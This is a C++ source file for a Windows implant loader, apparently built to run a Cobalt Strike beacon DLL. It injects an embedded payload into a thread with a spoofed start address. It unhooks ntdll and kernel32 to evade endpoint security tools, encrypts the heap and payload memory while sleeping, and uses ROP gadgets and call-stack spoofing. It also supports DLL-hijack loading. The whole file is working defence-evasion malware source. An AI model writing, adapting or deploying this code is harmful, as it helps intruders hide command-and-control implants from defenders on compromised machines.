#pragma once
#include "Definitions.hpp"

int is_empty(char* buf, size_t size)
{
	return buf[0] == 0 && !memcmp(buf, buf + 1, size - 1);
}

void getBlock(dataBlock* block, LPVOID location) {
	LPBYTE loc = (LPBYTE)location;
	while (memcmp(loc, (void*)"\x00", 1) != 0) {
		loc++;
	}
	block->location = location;
	block->size = loc-location;
}

// Heap encrypt function.  Walk all allocations in the heap and encrypt.
BOOL HeapEncrypt() {
	SecureZeroMemory(&entryEncryptDecrypt, sizeof(entryEncryptDecrypt));
#if defined(RELEASE_DLL) || defined (DEBUG_DLL)
	while (HeapWalk(myHeap, &entryEncryptDecrypt)) {
		if ((entryEncryptDecrypt.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
			DATA_KEY cryptoKey;
			cryptoKey.Length = keySize;
			cryptoKey.MaximumLength = keySize;
			cryptoKey.Buffer = (PVOID)key.c_str();
			if (SystemFunction032 == NULL) {
				SystemFunction032 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction032");
			}
			if (!is_empty((char*)(entryEncryptDecrypt.lpData), entryEncryptDecrypt.cbData)) {
				if (entryEncryptDecrypt.cbData > keySize) {
					int fullSize = 0;
					for (int x = 0; x < entryEncryptDecrypt.cbData; x++) {
						dataBlock block = { 0 };
						getBlock(&block, (LPBYTE)entryEncryptDecrypt.lpData + fullSize);
						if (block.size == 0) {
							fullSize += 1;
							continue;
						}
						CRYPT_BUFFER cryptoData = { 0 };
						cryptoData.Length = block.size;
						cryptoData.MaximumLength = block.size;
						cryptoData.Buffer = (char*)(block.location);
						SystemFunction032(&cryptoData, &cryptoKey);
						fullSize += block.size;
					}
				}
				else {
					CRYPT_BUFFER cryptoData = { 0 };
					cryptoData.Length = entryEncryptDecrypt.cbData;
					cryptoData.MaximumLength = entryEncryptDecrypt.cbData;
					cryptoData.Buffer = (char*)(entryEncryptDecrypt.lpData);
					SystemFunction032(&cryptoData, &cryptoKey);
				}
			}
		}
	}
#endif
#if defined(RELEASE_EXE) || defined(DEBUG_EXE)
	while (HeapWalk(GetProcessHeap(), &entryEncrypt)) {
		if ((entryEncrypt.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
			CRYPT_BUFFER cryptoData;
			cryptoData.Length = entryEncrypt.cbData;
			cryptoData.MaximumLength = entryEncrypt.cbData;
			cryptoData.Buffer = (char*)(entryEncrypt.lpData);
			DATA_KEY cryptoKey;
			cryptoKey.Length = keySize;
			cryptoKey.MaximumLength = keySize;
			cryptoKey.Buffer = (PVOID)key;
			if (SystemFunction032 == NULL) {
				SystemFunction032 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction032");
			}
			SystemFunction032(&cryptoData, &cryptoKey);
}
	}
#endif
	return 0;
}

// Heap Decrypt Function.  Walk all allocations in the heap and decrypt;
BOOL HeapDecrypt() {
	SecureZeroMemory(&entryEncryptDecrypt, sizeof(entryEncryptDecrypt));
#if defined(RELEASE_DLL) || defined (DEBUG_DLL)
	while (HeapWalk(myHeap, &entryEncryptDecrypt)) {
		if ((entryEncryptDecrypt.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
			DATA_KEY cryptoKey;
			cryptoKey.Length = keySize;
			cryptoKey.MaximumLength = keySize;
			cryptoKey.Buffer = (PVOID)key.c_str();
			if (SystemFunction033 == NULL) {
				SystemFunction033 = (SystemFunction033_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction033");
			}
			if (!is_empty((char*)(entryEncryptDecrypt.lpData), entryEncryptDecrypt.cbData)) {
				if (entryEncryptDecrypt.cbData > keySize) {
					int fullSize = 0;
					for (int x = 0; x < entryEncryptDecrypt.cbData; x++) {
						dataBlock block = { 0 };
						getBlock(&block, (LPBYTE)entryEncryptDecrypt.lpData + fullSize);
						if (block.size == 0) {
							fullSize += 1;
							continue;
						}
						CRYPT_BUFFER cryptoData = { 0 };
						cryptoData.Length = block.size;
						cryptoData.MaximumLength = block.size;
						cryptoData.Buffer = (char*)(block.location);
						SystemFunction033(&cryptoData, &cryptoKey);
						fullSize += block.size;
					}
				}
				else {
					CRYPT_BUFFER cryptoData = { 0 };
					cryptoData.Length = entryEncryptDecrypt.cbData;
					cryptoData.MaximumLength = entryEncryptDecrypt.cbData;
					cryptoData.Buffer = (char*)(entryEncryptDecrypt.lpData);
					SystemFunction033(&cryptoData, &cryptoKey);
						}
					}
		}
	}
#endif
#if defined(RELEASE_EXE) || defined(DEBUG_EXE)
	while (HeapWalk(GetProcessHeap(), &entryEncrypt)) {
		if ((entryEncrypt.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
			CRYPT_BUFFER cryptoData;
			cryptoData.Length = entryEncrypt.cbData;
			cryptoData.MaximumLength = entryEncrypt.cbData;
			cryptoData.Buffer = (char*)(entryEncrypt.lpData);
			DATA_KEY cryptoKey;
			cryptoKey.Length = keySize;
			cryptoKey.MaximumLength = keySize;
			cryptoKey.Buffer = (PVOID)key;
			if (SystemFunction033 == NULL) {
				SystemFunction033 = (SystemFunction033_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction033");
			}
			SystemFunction033(&cryptoData, &cryptoKey);
		}
	}
#endif
	return 0;
}

// Hooked VirtualAlloc
// We will only need to hook this for one call to identify the size and location of the offload CS dll
LPVOID HookedVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
	//LPVOID loc = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
	LPVOID loc = VirtualAllocEx(GetCurrentProcess(), lpAddress, dwSize, flAllocationType, PAGE_READWRITE);
	DWORD rewriteProtection = 0;
	VirtualProtect(loc, dwSize, PAGE_EXECUTE_READWRITE, &rewriteProtection);
	offload = loc;
	offloadSize = dwSize;
	GContextHook.ClearContext();
	Initialize4Context(FALSE);
	return loc;
}

// Hooked ExitProcess
// We do full cleanup and then a thread exit.
void WINAPI HookedExitProcess(DWORD dwExitCode) {
	// On DLL Hijack Loop forever so we dont exit main thread
	if (GetCurrentThreadId() == masterThreadID) {
		GContextHookM.ClearContext();
		while (TRUE);
	}

	GContextHook.ClearContext();
	RemoveVectoredExceptionHandler(pHandler);
	CloseHandle(ghMutex);

	TCHAR szFileName[MAX_PATH];
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	std::string fileName = szFileName;
	if (fileName.find(procNameHijack) != std::string::npos) {
		ExitProcess(0);
	}

	if (gadget == 0) {
		gadget = gadgetfinder64(1, 0);
	}

	config.encLocation = (LPVOID)(offload);
	config.BaseAddress = (LPVOID)selfBase;
	config.ExitThread = (LPVOID)&TerminateThread;
	config.ThreadHandle = GetCurrentThread();
	config.VirtualFree = (LPVOID)&VirtualFree;
	config.gadgetPad = (LPVOID)(dllOffloadEntryPoint);
	config.gadget = gadget;
	config.FreeType = MEM_RELEASE;

	QueueUserAPC((PAPCFUNC)freeRop, GetCurrentThread(), (ULONG_PTR)&config);
	if (NtTestAlert == NULL) {
		HMODULE ntdllLib = LoadLibrary("ntdll.dll");
		if (ntdllLib) {
			NtTestAlert = (NtTestAlert_t)GetProcAddress(ntdllLib, "NtTestAlert");
		}
	}
	HeapDestroy(myHeap);
	NtTestAlert();
}

// Hooked Get Process Heap
// Return our custom heap handle for encryption/destruction
HANDLE HookedGetProcessHeap() {
	return myHeap;
}

// Hooked Sleep
// Encryption takes place here
// RX -> RW takes place here
// Temporary removal of hooks takes place here
void WINAPI HookedSleep(DWORD dwMiliseconds) {
	//dwMiliseconds = 5000;
	if (dwMiliseconds > 1000) {
		if (SystemFunction032 == NULL) {
			SystemFunction032 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction032");
		}

		if (SystemFunction033 == NULL) {
			SystemFunction033 = (SystemFunction033_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction033");
		}

		if (gadget == 0) {
			gadget = gadgetfinder64(1, 0);
		}

		key = gen_random(keySize);

		DWORD OldProtect = 0;
		DATA_KEY cryptoKey;
		cryptoKey.Length = keySize;
		cryptoKey.MaximumLength = keySize;
		cryptoKey.Buffer = (PVOID)key.c_str();
		CRYPT_BUFFER cryptoData;
		cryptoData.Length = (SIZE_T)offloadSize;
		cryptoData.MaximumLength = (SIZE_T)offloadSize;
		cryptoData.Buffer = (char*)(LPVOID)(offload);
		CRYPT_BUFFER cryptoDataMain;
		cryptoDataMain.Length = (SIZE_T)selfBaseSize;
		cryptoDataMain.MaximumLength = (SIZE_T)selfBaseSize;
		cryptoDataMain.Buffer = (char*)(LPVOID)selfBase;

		config.encLocation = (LPVOID)(offload);
		config.encLocationSize = (SIZE_T)offloadSize;
		config.OldProtect = &OldProtect;
		config.dwMilisconds = dwMiliseconds;
		config.OldSleep = (LPVOID)SleepEx;
		config.VirtualProtect = (LPVOID)&VirtualProtect;
		config.Encrypt = (LPVOID)SystemFunction032;
		config.Decrypt = (LPVOID)SystemFunction033;
		config.PayloadBuffer = &cryptoData;
		config.key = &cryptoKey;
		config.gadget = gadget;
		config.gadgetPad = (LPBYTE)gadget + 0x02;
		config.BaseAddress = (LPVOID)selfBase;
		config.DLLSize = (SIZE_T)selfBaseSize;
		config.EncryptBuffer = &cryptoDataMain;

		QueueUserAPC((PAPCFUNC)cryptor, GetCurrentThread(), (ULONG_PTR)&config);
#if defined(RELEASE_EXE) || defined (DEBUG_EXE)
		HeapLock(GetProcessHeap());
		DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
		HeapEncryptDecrypt();

		spoof_call(jmp_rbx_0, &OldSleep, (DWORD)dwMiliseconds);

		HeapEncryptDecrypt();
		HeapUnlock(GetProcessHeap());
		DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
#else
		GContextHook.ClearContext();
		RemoveVectoredExceptionHandler(pHandler);
		HeapEncrypt();
		if (NtTestAlert == NULL) {
			HMODULE ntdllLib = LoadLibrary("ntdll.dll");
			if (ntdllLib) {
				NtTestAlert = (NtTestAlert_t)GetProcAddress(ntdllLib, "NtTestAlert");
			}
		}
		NtTestAlert();
		HeapDecrypt();
		pHandler = AddVectoredExceptionHandler(rand() % 0xFFFFFF, ExceptionHandler);
		Initialize4Context(FALSE);
#endif
	}
	else {
		if (jmp_rbx_0 == 0) {
			jmp_rbx_0 = gadgetfinder64(0, 2);
		}
		spoof_call(jmp_rbx_0, &timerSleep, (double)(dwMiliseconds / 1000));
	}
#if defined(RELEASE_DLL) || defined (DEBUG_DLL)
#endif 
}

void doCleanup(LPVOID cleanup) {
	SleepEx(500, FALSE);
	VirtualFree(cleanup, 0, MEM_RELEASE);
}

// Entry Point
#if defined(RELEASE_DLL)
__declspec(dllexport) void main(LPVOID dllOffloadEntry = NULL)
#else
void main()
#endif
{
	TCHAR szFileName[MAX_PATH];
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	std::string fileName = szFileName;
	if (fileName.find(procNameHijack) != std::string::npos) {
		::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	}

	// Get a list of all the modules in this process.
	MEMORY_BASIC_INFORMATION selfData = { 0 };
	VirtualQuery(&main, &selfData, sizeof(selfData));
	MEMORY_BASIC_INFORMATION selfData2 = { 0 };
	VirtualQuery(selfData.AllocationBase, &selfData2, sizeof(selfData2));

	selfBase = selfData2.AllocationBase;
	selfBaseSize = selfData2.RegionSize;

	// Mutext Check and Cleanup
	DWORD myPid = GetCurrentProcessId();
	std::string myPidString = std::to_string(myPid);
	std::string mutexName;
	mutexName.append(myPidString);
	mutexName.append("_AXX");

	ghMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, (LPCSTR)mutexName.c_str());

	if (ghMutex == NULL)
	{
		ghMutex = CreateMutex(
			NULL,              // default security attributes
			FALSE,             // initially not owned
			(LPCSTR)mutexName.c_str());             // unnamed mutex
	}
	else {
		dllOffloadEntryPoint = dllOffloadEntry;
		HookedExitProcess(0);
	}

	//SymInitialize(GetCurrentProcess(), NULL, TRUE);
	// Refresh the most important DLLs in case they are hooked and detect any VEH hooks
	universalRefresher("ntdll.dll");
	universalRefresher("kernel32.dll");
	universalRefresher("kernelbase.dll");
	universalRefresher("msvcrt.dll");

	static HANDLE hproc = GetCurrentProcess();
	static size_t bytesWritten = 0;
	static DWORD oldProtect = 0;
	void* sh = VirtualAllocEx(hproc, 0, (SIZE_T)Pay_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(hproc, sh, Pay_dll, Pay_len, &bytesWritten);
	VirtualProtectEx(hproc, sh, Pay_len, PAGE_EXECUTE_READ, &oldProtect);
#if defined(RELEASE_EXE) || defined(DEBUG_EXE) || defined(DEBUG_DLL)
	//HANDLE threadToResume = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sh, NULL, CREATE_SUSPENDED, &hookID);
	//ResumeThread(threadToResume);
	LPVOID fakeAddr = (LPVOID)(((ULONG_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "RtlUserThreadStart")) + 0x21);

	RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlCreateUserThread");
	HANDLE threadHandle;
	RtlCreateUserThread(hproc, NULL, true, 0, 0, 0, (LPTHREAD_START_ROUTINE)fakeAddr, NULL, &threadHandle, NULL);
	hookID = GetThreadId(threadHandle);
	// Get the current registers set for our thread
	CONTEXT ctx;
	ZeroMemory(&ctx, sizeof(CONTEXT));
	ctx.ContextFlags = CONTEXT_CONTROL;
	GetThreadContext(threadHandle, &ctx);
	ctx.Rip = (DWORD64)sh;
	SetThreadContext(threadHandle, &ctx);
	SleepEx(1000, FALSE);
	Initialize3Context(TRUE);
	ResumeThread(threadHandle);
	while (TRUE) {};
#endif
#ifdef RELEASE_DLL
	RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlCreateUserThread");
	HANDLE threadHandle;
	RtlCreateUserThread(hproc, NULL, true, 0, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, NULL, &threadHandle, NULL);
	hookID = GetThreadId(threadHandle);
	// Get the current registers set for our thread
	CONTEXT ctx;
	ZeroMemory(&ctx, sizeof(CONTEXT));
	ctx.ContextFlags = CONTEXT_CONTROL;
	GetThreadContext(threadHandle, &ctx);
	ctx.Rip = (DWORD64)sh;
	SetThreadContext(threadHandle, &ctx);
	SleepEx(1500, FALSE);
	Initialize3Context(FALSE);
	ResumeThread(threadHandle);

	if (fileName.find(procNameHijack) != std::string::npos) {
		Initialize2Context(FALSE);
	} else if (fileName.find("rundll32") != std::string::npos) {
		while (TRUE);
	}

	if (dllOffloadEntry != NULL) {
		MEMORY_BASIC_INFORMATION cleanOffloader = { 0 };
		VirtualQuery(dllOffloadEntry, &cleanOffloader, sizeof(cleanOffloader));
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)doCleanup, (LPVOID)cleanOffloader.AllocationBase, 0, NULL);
	}
#endif
}

// DLL Entry Point
#if defined(RELEASE_DLL)
BOOL WINAPI DllMain(
	HINSTANCE hinstDLL,  // handle to DLL module
	DWORD fdwReason,	 // reason for calling function
	LPVOID lpReserved)  // reserved
{
	// Perform actions based on the reason for calling.
	TCHAR szFileName[MAX_PATH];
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	std::string fileName = szFileName;
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.
		if (fileName.find(procNameHijack) != std::string::npos) {
			main();
		}
		break;

	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;

	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		break;

	case DLL_PROCESS_DETACH:
		// Perform any necessary cleanup.
		break;
	}
	return TRUE;  // Successful DLL_PROCESS_ATTACH.
};
#endif